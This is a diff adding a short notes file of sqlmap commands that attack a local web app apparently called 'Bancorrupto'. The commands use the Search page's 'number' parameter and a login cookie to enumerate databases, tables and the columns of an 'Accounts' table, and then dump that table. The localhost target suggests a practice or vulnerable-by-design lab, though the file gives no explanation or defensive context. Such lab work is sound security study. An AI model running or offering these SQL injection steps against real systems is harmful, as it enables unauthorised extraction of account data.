@@ -1,0 +1,15 @@
+-- Databases
+
+python sqlmap.py -u https://localhost:44385/Home/Search?number=es --cookie=".AspNetCore.Identity.Application=" -D Bancorrupto --dbs
+
+-- Database tables
+
+python sqlmap.py -u https://localhost:44385/Home/Search?number=es --cookie=".AspNetCore.Identity.Application=" -D Bancorrupto --tables
+
+-- Table columns 
+
+python sqlmap.py -u https://localhost:44385/Home/Search?number=es --cookie=".AspNetCore.Identity.Application=" -T Accounts --columns
+
+-- Data dump
+
+python sqlmap.py -u https://localhost:44385/Home/Search?number=es --cookie=".AspNetCore.Identity.Application=" -D Bancorrupto -T Accounts --dump
